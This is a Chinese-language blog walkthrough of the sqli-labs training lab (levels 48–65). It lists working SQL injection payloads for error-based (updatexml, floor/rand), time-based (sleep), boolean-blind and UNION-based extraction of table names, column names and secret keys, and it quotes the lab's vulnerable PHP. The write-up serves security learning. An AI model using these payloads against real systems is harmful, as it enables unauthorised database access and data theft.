<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?sort&#x3D;0&#39; or updatexml(1, concat(0x7e, database(), 0x7e), 1)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-48"><a href="#less-48" class="headerlink" title="less-48"></a>less-48</h2><p>闭合方式：<code>order by $id</code></p>
<p>和 Less-47 相比少了报错注入，布尔、延时盲注依然可以正常使用，into outfile 也可以</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 测试：</span><br><span class="line">?sort&#x3D;1</span><br><span class="line">?sort&#x3D;1--+</span><br><span class="line">?sort&#x3D;1 or sleep(3)--+ # 无延时</span><br><span class="line">?sort&#x3D;0 or sleep(3)--+ # 有延时</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="less-49"><a href="#less-49" class="headerlink" title="less-49"></a>less-49</h2><p>闭合方式：<code>ORDER BY &#39;$id&#39;</code></p>
<p>和 <code>Less-47</code> 相比少了报错注入，布尔、延时盲注依然可以正常使用，<code>into outfile</code> 也可以</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 测试</span><br><span class="line">?sort&#x3D;1        # 正常排序</span><br><span class="line">?sort&#x3D;1--+     # 正常排序</span><br><span class="line">?sort&#x3D;1 or sleep(3)--+ # 无延时</span><br><span class="line">?sort&#x3D;0 or sleep(3)--+ # 无延时</span><br><span class="line"># 说明闭合方式不是 order by $id</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?sort&#x3D;1&#39;        # 不正常排序</span><br><span class="line">?sort&#x3D;1&#39;--+     # 正常排序</span><br><span class="line">?sort&#x3D;0&#39; or sleep(3)--+ # 有延时</span><br><span class="line">?sort&#x3D;1&#39; or sleep(3)--+ # 无延时</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="less-50"><a href="#less-50" class="headerlink" title="less-50"></a>less-50</h2><p>闭合方式：<code>ORDER BY $id</code></p>
<p>和 Less-46 相比，查询方式由 mysql_query 变成了 mysqli_multi_query，因此支持堆叠注入，在注入方面会更加灵活。</p>
<p>关键代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br><span class="line"><span class="comment"># 堆叠注入 </span></span><br><span class="line">mysqli_multi_query($con1, $sql)</span><br><span class="line"><span class="comment"># 打印错误</span></span><br><span class="line">print_r(mysqli_error($con1));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>尝试注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 测试</span><br><span class="line">?sort&#x3D;0 or updatexml(1, concat(0x7e, database(), 0x7e), 1)--+ </span><br><span class="line"># XPATH syntax error: &#39;~security~&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-51"><a href="#less-51" class="headerlink" title="less-51"></a>less-51</h2><p>闭合方式：<code>ORDER BY &#39;$id&#39;</code></p>
<p>和 Less-50 相比只是拼接方式发生了变化，实际注入的时候只需做一下对应的闭合即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?sort&#x3D;1        # 正常排序</span><br><span class="line">?sort&#x3D;1--+     # 正常排序（&#39;1--+&#39;被强制类型转换为1）</span><br><span class="line">?sort&#x3D;1&#39;       # 报错，order by &#39;1&#39;&#39;</span><br><span class="line">?sort&#x3D;1&#39;--+    # 正常排序（order by &#39;1&#39;-- &#39;）</span><br><span class="line"></span><br><span class="line"># 报错注入</span><br><span class="line">?sort&#x3D;1&#39; and updatexml(1, concat(0x7e, database(), 0x7e), 1)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="less-52"><a href="#less-52" class="headerlink" title="less-52"></a>less-52</h2><p>闭合方式：<code>ORDER BY $id</code></p>
<p>和 Less-50 是一样的，只是少了报错注入的利用方式。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?sort&#x3D;1       # 正常回显</span><br><span class="line">?sort&#x3D;1--+    # 正常回显</span><br><span class="line">?sort&#x3D;1&#39;      # 不显示（order by 1&#39;，出错但是没有显示报错信息） </span><br><span class="line">?sort&#x3D;1&#39;--+   # 不显示（order by 1&#39;--+，出错但是没有显示报错信息）</span><br><span class="line"></span><br><span class="line"># 验证</span><br><span class="line">?sort&#x3D;0 or sleep(3)--+</span><br><span class="line"># 有明显延时</span><br><span class="line"></span><br><span class="line"># 布尔注入</span><br><span class="line">?sort&#x3D;rand(left(database(),1)&gt;&#39;s&#39;)</span><br><span class="line">?sort&#x3D;rand(left(database(),1)&gt;&#39;r&#39;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><p>闭合方式：<code>ORDER BY &#39;$id&#39;</code></p>
<p>和 Less-51 是一样的，只是少了报错注入的利用方式。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?sort&#x3D;1        # 正常回显</span><br><span class="line">?sort&#x3D;1--+     # 正常回显</span><br><span class="line">?sort&#x3D;1&#39;       # 不显示</span><br><span class="line">?sort&#x3D;1&#39;--+    # 正常显示</span><br><span class="line"></span><br><span class="line"># 验证</span><br><span class="line">?sort&#x3D;1&#39; or sleep(3)--+ # 无延时</span><br><span class="line">?sort&#x3D;0&#39; or sleep(3)--+ # 有明显延时</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="5-进阶挑战-54-65"><a href="#5-进阶挑战-54-65" class="headerlink" title="5 进阶挑战(54-65)"></a>5 进阶挑战(54-65)</h1><h2 id="less-54"><a href="#less-54" class="headerlink" title="less-54"></a>less-54</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p>
<p>判断闭合方式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&#39;--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>判断字段数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&#39; order by 3--+</span><br><span class="line">?id&#x3D;1&#39; order by 4--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>查看回显的字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;-1&#39; union select 1,2,3 --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>查询表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA&#x3D;DATABASE()) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>查询结果为<code>HLBSTFO6HB</code>，结果不唯一<br>查询列名（记得修改表名为上面的查询结果）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME&#x3D;0x484c425354464f364842)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>列名为：id、secret_XBJJ、sessid、tryy<br>查询表中的数据（修改字段名、表名）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(secret_XBJJ)+FROM+HLBSTFO6HB)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最后查到key值为：<code>kRTCQUzl170VXBxrCqlTWuyZ</code></p>
<hr>
<h2 id="less-55"><a href="#less-55" class="headerlink" title="less-55"></a>less-55</h2><p>闭合方式：<code>id=($id)</code><br>Less-55 给了 14 次尝试机会，代码基本上没有变化，只是闭合方式发生了变化。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 验证</span><br><span class="line">?id&#x3D;1) --+</span><br><span class="line"></span><br><span class="line"># 查询表名</span><br><span class="line">?id&#x3D;-1) union select 1,2,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA&#x3D;DATABASE()) --+</span><br><span class="line"># P0ULLTHD09</span><br><span class="line"></span><br><span class="line"># 查询字段名</span><br><span class="line">?id&#x3D;-1) union select 1,2,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME&#x3D;&#39;P0ULLTHD09&#39;)--+</span><br><span class="line"># id、sessid、secret_0SEC、tryy</span><br><span class="line"></span><br><span class="line"># 查询key值</span><br><span class="line">?id&#x3D;-1) union select 1,2,(SELECT+GROUP_CONCAT(secret_0SEC)+FROM+P0ULLTHD09)--+</span><br><span class="line"># hSoUfCvuUNHhjG8CQInhuVv2</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-56"><a href="#less-56" class="headerlink" title="less-56"></a>less-56</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code></p>
<p>闭合方式不同。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 查询表名</span><br><span class="line">?id&#x3D;-1&#39;) union select 1,2,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA&#x3D;DATABASE()) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-57"><a href="#less-57" class="headerlink" title="less-57"></a>less-57</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code></p>
<p>闭合方式不同。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 查询表名</span><br><span class="line">?id&#x3D;-1&quot; union select 1,2,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA&#x3D;DATABASE()) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-58"><a href="#less-58" class="headerlink" title="less-58"></a>less-58</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p>
<p>uname 和 pass 都只输出数组中的结果，union 查询无法回显。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$unames=<span class="keyword">array</span>(<span class="string">&quot;Dumb&quot;</span>,<span class="string">&quot;Angelina&quot;</span>,<span class="string">&quot;Dummy&quot;</span>,<span class="string">&quot;secure&quot;</span>,<span class="string">&quot;stupid&quot;</span>,<span class="string">&quot;superman&quot;</span>,<span class="string">&quot;batman&quot;</span>,<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;admin1&quot;</span>,<span class="string">&quot;admin2&quot;</span>,<span class="string">&quot;admin3&quot;</span>,<span class="string">&quot;dhakkan&quot;</span>,<span class="string">&quot;admin4&quot;</span>);</span><br><span class="line">$pass = ($unames);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Login name : &#x27;</span>. $unames[$row[<span class="string">&#x27;id&#x27;</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password : &#x27;</span> .$pass[$row[<span class="string">&#x27;id&#x27;</span>]];</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>但是可以输出报错信息，可以尝试进行报错注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1&#39;+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(secret_OD68 )+AS+CHAR),0x7e))+FROM+WOO6ID239T+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="less-59"><a href="#less-59" class="headerlink" title="less-59"></a>less-59</h2><p>闭合方式：<code>id=$id</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 猜测闭合方式</span><br><span class="line">?id&#x3D;1        # 正常显示</span><br><span class="line">?id&#x3D;1--+     # 正常显示</span><br><span class="line">?id&#x3D;1&#39;       # 报错</span><br><span class="line">?id&#x3D;1&#39;--+    # 报错</span><br><span class="line"></span><br><span class="line"># 验证</span><br><span class="line">?id&#x3D;0 or sleep(3) --+ # 有明显延时</span><br><span class="line">?id&#x3D;1 or sleep(3) --+ # 无延时</span><br><span class="line"></span><br><span class="line"># 报错注入</span><br><span class="line">?id&#x3D;0 or updatexml(1, concat(0x7e, database(), 0x7e), 1)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-60"><a href="#less-60" class="headerlink" title="less-60"></a>less-60</h2><p>闭合方式：<code>id=（&quot;$id&quot;）</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 猜测闭合方式</span><br><span class="line">?id&#x3D;1        # 正常显示（强制类型转化为1）</span><br><span class="line">?id&#x3D;1--+     # 正常显示（强制类型转化为1）</span><br><span class="line">?id&#x3D;1&#39;       # 正常显示（强制类型转化为1）</span><br><span class="line">?id&#x3D;1&#39;--+    # 正常显示（强制类型转化为1）</span><br><span class="line">?id&#x3D;1&quot;       # 报错,并能看到需要添加括号。</span><br><span class="line">?id&#x3D;1&quot;) --+  # 正常显示</span><br><span class="line"></span><br><span class="line"># 报错注入</span><br><span class="line">?id&#x3D;0&quot;) or updatexml(1, concat(0x7e, database(), 0x7e), 1)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-61"><a href="#less-61" class="headerlink" title="less-61"></a>less-61</h2><p>闭合方式：<code>id=((&#39;$id&#39;))</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 猜测闭合方式（自己手动多次后，可以考虑采用Burp Suite+字典进行测试）</span><br><span class="line">?id&#x3D;1&#39;         # 报错，并且看到需要添加双层括号</span><br><span class="line">?id&#x3D;1&#39;)) --+   # 正常显示</span><br><span class="line"></span><br><span class="line"># 报错注入</span><br><span class="line">?id&#x3D;0&#39;)) or updatexml(1, concat(0x7e, database(), 0x7e), 1)--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-62"><a href="#less-62" class="headerlink" title="less-62"></a>less-62</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code></p>
<p>不能报错注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 猜测闭合方式(在猜测时，最好列举一个比较全面的闭合方式来猜测)</span><br><span class="line">?id&#x3D;1        # 正常显示</span><br><span class="line">?id&#x3D;1&#39;       # 报错（显示</span><br><span class="line">?id&#x3D;1&#39;)--+   # 正常显示</span><br><span class="line"></span><br><span class="line"># 验证</span><br><span class="line">?id&#x3D;0&#39;) or sleep(3)--+</span><br><span class="line"></span><br><span class="line"># 布尔注入</span><br><span class="line">?id&#x3D;0&#39;) or if(left(database(), 1)&#x3D;&#39;s&#39;, 1, 0)--+    # 不显示</span><br><span class="line">?id&#x3D;0&#39;) or if(left(database(), 1)&#x3D;&#39;c&#39;, 1, 0)--+    # 正常显示</span><br><span class="line">?id&#x3D;0&#39;) or if(left(database(), 2)&#x3D;&#39;ch&#39;, 1, 0)--+   # 正常显示</span><br><span class="line"></span><br><span class="line"># 延时注入</span><br><span class="line">?id&#x3D;0&#39;) or if(left(database(), 1)&#x3D;&#39;s&#39;, sleep(3), 0)--+    # 不显示</span><br><span class="line">?id&#x3D;0&#39;) or if(left(database(), 1)&#x3D;&#39;c&#39;, sleep(3), 0)--+    # 明显延时</span><br><span class="line">?id&#x3D;0&#39;) or if(left(database(), 2)&#x3D;&#39;ch&#39;, sleep(3), 0)--+   # 明显延时</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-63"><a href="#less-63" class="headerlink" title="less-63"></a>less-63</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p>
<p>类似less-62</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 猜测闭合方式</span><br><span class="line">?id&#x3D;1        # 正常显示</span><br><span class="line">?id&#x3D;1&#39;       # 报错</span><br><span class="line">?id&#x3D;1&#39;--+    # 正常显示</span><br><span class="line"></span><br><span class="line"># 验证</span><br><span class="line">?id&#x3D;0&#39; or sleep(3)--+</span><br><span class="line"></span><br><span class="line"># 布尔注入</span><br><span class="line">?id&#x3D;0&#39; or if(left(database(), 1)&#x3D;&#39;s&#39;, 1, 0)--+    # 不显示</span><br><span class="line">?id&#x3D;0&#39; or if(left(database(), 1)&#x3D;&#39;c&#39;, 1, 0)--+    # 正常显示</span><br><span class="line">?id&#x3D;0&#39; or if(left(database(), 2)&#x3D;&#39;ch&#39;, 1, 0)--+   # 正常显示</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-64"><a href="#less-64" class="headerlink" title="less-64"></a>less-64</h2><p>闭合方式：<code>id=(($id))</code></p>
<p>类似less-62</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 验证</span><br><span class="line">?id&#x3D;0)) or sleep(3)--+    # 明显延时</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="less-65"><a href="#less-65" class="headerlink" title="less-65"></a>less-65</h2><p>闭合方式：<code>id=(&quot;$id&quot;)</code></p>
<p>类似less-62</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 验证</span><br><span class="line">?id&#x3D;0&quot;) or sleep(3)--+    # 明显延时</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="6-思维导图"><a href="#6-思维导图" class="headerlink" title="6 思维导图"></a>6 思维导图</h1><p>自己总结的思维导图。如果有更好的想法，欢迎和我交流<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210115123359.png"></p>
<p>幕布地址：<a target="_blank" rel="noopener" href="https://share.mubu.com/doc/qV0gisrYy6">https://share.mubu.com/doc/qV0gisrYy6</a></p>
<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p>参考教程：</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41420747/article/details/81836327">sqli-lab教程——1-35通关Writeup-地址ch3nye.top</a></li>
<li><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/05/sqlilabs.html">SQLI labs 靶场精简学习记录-国光</a></li>
</ol>

      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/38f31199edc1/" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>上一页</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime" title="更新时间"></i>
              2021-01-11 12:27:47
            </span>
            
                  <span class="post-categories">
                    <i class="iconfont icon-bookmark" title="分类"></i>
                    
                    <span class="span--category">
                      <a href="/categories/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8/" title="网络空间安全">
                        <b>#</b> 网络空间安全
                      </a>
                    </span>
                    
                  </span>
              
          </div>
          <div class="post-foot-prev">
            
              <a href="/f3a17a5034c5/" target="_self">
                <span>下一页</span>
                <i class="iconfont icon-chevronright"></i>
              </a>
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">目录</div>
    <div class="catalog-content">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-text">1 准备工作</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E5%9F%BA%E7%A1%80%E6%8C%91%E6%88%98-1-20"><span class="toc-text">2 基础挑战(1-20)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#less-1"><span class="toc-text">less-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-2"><span class="toc-text">less-2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-3"><span class="toc-text">less-3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-4"><span class="toc-text">less-4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-5"><span class="toc-text">less-5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5"><span class="toc-text">布尔注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="toc-text">延时注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-6"><span class="toc-text">less-6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-7"><span class="toc-text">less-7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-8"><span class="toc-text">less-8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-9"><span class="toc-text">less-9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-10"><span class="toc-text">less-10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hackbar"><span class="toc-text">Hackbar</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-11"><span class="toc-text">less-11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-12"><span class="toc-text">less-12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-14"><span class="toc-text">less-14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-15"><span class="toc-text">less-15</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-16"><span class="toc-text">less-16</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-17"><span class="toc-text">less-17</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-18"><span class="toc-text">less-18</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-19"><span class="toc-text">less-19</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-20"><span class="toc-text">less-20</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5-21-37"><span class="toc-text">3 高级注入(21-37)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#less-21"><span class="toc-text">less-21</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-22"><span class="toc-text">less-22</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-23"><span class="toc-text">less-23</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-24"><span class="toc-text">less-24</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-25"><span class="toc-text">less-25</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-26"><span class="toc-text">less-26</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-26a"><span class="toc-text">less-26a</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-27"><span class="toc-text">less-27</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-27a"><span class="toc-text">less-27a</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-28"><span class="toc-text">less-28</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-28a"><span class="toc-text">less-28a</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-30"><span class="toc-text">less-30</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-30-1"><span class="toc-text">less-30</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-31"><span class="toc-text">less-31</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#less-32"><span class="toc-text">less-32</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 